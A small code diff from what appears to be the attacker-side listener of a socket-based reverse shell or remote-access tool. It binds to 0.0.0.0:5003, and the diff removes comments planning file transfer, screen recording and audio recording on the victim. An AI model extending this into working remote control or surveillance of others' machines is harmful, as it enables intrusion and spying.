@@ -1,12 +1,6 @@
 import socket
 
-# IMPROVEMENTS
-
-# Add download and upload commands: Transfer files with socket
-# Custom command to record screen and download the video
-# Command to record audio
-
-# SERVER SIDE - Attacker
+# CLIENT SIDE - Attacker
 
 SERVER_HOST = "0.0.0.0"
 SERVER_PORT = 5003
